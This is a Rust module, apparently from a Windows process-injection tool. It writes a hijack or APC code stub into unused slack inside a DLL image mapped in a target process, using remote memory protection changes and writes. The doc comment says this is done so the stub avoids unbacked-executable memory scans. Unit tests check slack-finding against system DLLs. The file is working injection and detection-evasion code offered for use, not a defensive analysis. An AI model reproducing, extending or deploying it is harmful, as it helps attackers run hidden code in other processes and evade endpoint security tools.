#![cfg(windows)]

//! Stub placement inside the mapped image.
//!
//! A hijack or APC stub normally needs its own `NtAllocateVirtualMemory` region
//! with `PAGE_EXECUTE_READ`, and that region has no file backing — exactly what
//! an unbacked-executable scan looks for. This module instead writes the stub
//! into slack that is already inside the image: the padding at the tail of a
//! section page, or the alignment gap before the next section.
//!
//! The pages are still part of the file-backed section, so the VAD entry is the
//! image itself. Only the touched page becomes privately dirty, which is the
//! same thing that happens when any loader patches an import thunk.
//!
//! `place` returns `Err` when there is no usable slack or when the protection
//! change is refused, and callers fall back to a separate allocation.

use std::path::Path;

use crate::nt;

struct Section {
    va: usize,
    end: usize,
}

/// Parse the section table and return the largest free RVA range.
fn find_slack(dll: &Path, need: usize) -> Result<usize, String> {
    let data = std::fs::read(dll).map_err(|e| format!("read payload: {e}"))?;
    if data.len() < 0x100 {
        return Err("payload too small".into());
    }

    let lfanew = u32::from_le_bytes([data[0x3C], data[0x3D], data[0x3E], data[0x3F]]) as usize;
    if data.len() < lfanew + 0x18 {
        return Err("truncated PE".into());
    }
    if u32::from_le_bytes([data[lfanew], data[lfanew + 1], data[lfanew + 2], data[lfanew + 3]])
        != 0x0000_4550
    {
        return Err("bad PE signature".into());
    }

    let section_count = u16::from_le_bytes([data[lfanew + 6], data[lfanew + 7]]) as usize;
    let optional_size = u16::from_le_bytes([data[lfanew + 20], data[lfanew + 21]]) as usize;
    let optional = lfanew + 24;
    if optional_size < 64 || data.len() < optional + optional_size {
        return Err("truncated optional header".into());
    }
    if u16::from_le_bytes([data[optional], data[optional + 1]]) != 0x020B {
        return Err("only x64 payloads supported".into());
    }

    let read32 = |at: usize| -> usize {
        u32::from_le_bytes([data[at], data[at + 1], data[at + 2], data[at + 3]]) as usize
    };
    let size_of_image = read32(optional + 56);
    let size_of_headers = read32(optional + 60);

    let table = optional + optional_size;
    let mut sections = Vec::with_capacity(section_count);
    for i in 0..section_count {
        let entry = table + i * 40;
        if data.len() < entry + 40 {
            return Err("truncated section table".into());
        }
        let virtual_size = read32(entry + 8);
        let va = read32(entry + 12);
        let raw_size = read32(entry + 16);
        sections.push(Section {
            va,
            end: va + virtual_size.max(raw_size),
        });
    }
    sections.sort_by_key(|s| s.va);

    // Real gaps between sections win: they hold no loader-relevant bytes.
    let mut gaps: Vec<(usize, usize)> = Vec::new();
    let mut cursor = size_of_headers.min(size_of_image);
    for section in &sections {
        if section.va > cursor {
            gaps.push((cursor, section.va));
        }
        cursor = cursor.max(section.end);
    }
    if size_of_image > cursor {
        gaps.push((cursor, size_of_image));
    }

    let fits = |start: usize, end: usize| -> Option<usize> {
        let start = (start + 15) & !15;
        (end > start && end - start >= need).then_some(start)
    };

    gaps.sort_by_key(|(start, end)| std::cmp::Reverse(end - start));
    if let Some(rva) = gaps.iter().find_map(|(start, end)| fits(*start, *end)) {
        return Ok(rva);
    }

    // Fallback: padding after the section table, still inside the header page.
    // Every image has this; it carries no loader-relevant data.
    let header_end = table + section_count * 40;
    let header_limit = sections.first().map(|s| s.va).unwrap_or(size_of_image);
    fits(header_end, header_limit).ok_or_else(|| format!("no image slack of {need} bytes"))
}

fn set_protect(process: usize, base: usize, size: usize, protect: u32) -> Result<u32, String> {
    nt::protect(process, base, size, protect)
}

/// Write `code` into image slack and return its address in the target.
pub fn place(process: usize, image_base: usize, dll: &Path, code: &[u8]) -> Result<usize, String> {
    let rva = find_slack(dll, code.len())?;
    let address = image_base + rva;
    let page_start = address & !0xFFF;
    let page_end = (address + code.len() + 0xFFF) & !0xFFF;
    let span = page_end - page_start;

    let write = |protect: u32| -> Result<(), String> {
        set_protect(process, page_start, span, protect)?;
        nt::write(process, address, code)
    };

    let result = write(nt::PAGE_RWX)
        .or_else(|_| write(nt::PAGE_RW))
        .and_then(|_| {
            let _ = set_protect(process, page_start, span, nt::PAGE_RX);
            Ok(())
        });

    result.map(|_| address)
}

/// Prefer image slack; fall back to a private RX allocation.
pub fn place_or_allocate(
    process: usize,
    image_base: usize,
    dll: &Path,
    code: &[u8],
    fallback_size: usize,
) -> Result<usize, String> {
    match place(process, image_base, dll, code) {
        Ok(address) => Ok(address),
        Err(_) => {
            let memory = nt::allocate(process, fallback_size.max(code.len()))?;
            nt::write(process, memory, code)?;
            nt::protect(process, memory, fallback_size.max(code.len()), nt::PAGE_RX)?;
            Ok(memory)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::find_slack;
    use std::path::PathBuf;

    fn system_dll(name: &str) -> Option<PathBuf> {
        let root = std::env::var_os("SystemRoot")?;
        let path = PathBuf::from(root).join("System32").join(name);
        path.exists().then_some(path)
    }

    fn image_size(dll: &std::path::Path) -> usize {
        let data = std::fs::read(dll).unwrap();
        let lfanew = u32::from_le_bytes([data[0x3C], data[0x3D], data[0x3E], data[0x3F]]) as usize;
        let optional = lfanew + 24;
        u32::from_le_bytes([
            data[optional + 56],
            data[optional + 57],
            data[optional + 58],
            data[optional + 59],
        ]) as usize
    }

    fn section_ranges(dll: &std::path::Path) -> Vec<(usize, usize)> {
        let data = std::fs::read(dll).unwrap();
        let lfanew = u32::from_le_bytes([data[0x3C], data[0x3D], data[0x3E], data[0x3F]]) as usize;
        let count = u16::from_le_bytes([data[lfanew + 6], data[lfanew + 7]]) as usize;
        let optional_size = u16::from_le_bytes([data[lfanew + 20], data[lfanew + 21]]) as usize;
        let table = lfanew + 24 + optional_size;
        let read32 = |at: usize| {
            u32::from_le_bytes([data[at], data[at + 1], data[at + 2], data[at + 3]]) as usize
        };
        (0..count)
            .map(|i| {
                let entry = table + i * 40;
                let va = read32(entry + 12);
                let end = va + read32(entry + 8).max(read32(entry + 16));
                (va, end)
            })
            .collect()
    }

    #[test]
    fn slack_lands_between_sections() {
        for name in ["kernel32.dll", "ntdll.dll", "user32.dll"] {
            let Some(dll) = system_dll(name) else { continue };
            let need = 200usize;
            let rva = find_slack(&dll, need).expect("slack found");
            assert_eq!(rva % 16, 0, "{name}: unaligned");
            assert!(rva + need <= image_size(&dll), "{name}: past SizeOfImage");

            let end = rva + need;
            for (start, stop) in section_ranges(&dll) {
                let overlaps = rva < stop && end > start;
                assert!(!overlaps, "{name}: {rva:#x}..{end:#x} overlaps {start:#x}..{stop:#x}");
            }
        }
    }

    #[test]
    fn oversized_request_fails_cleanly() {
        let Some(dll) = system_dll("ntdll.dll") else { return };
        assert!(find_slack(&dll, 0x4000_0000).is_err());
    }
}
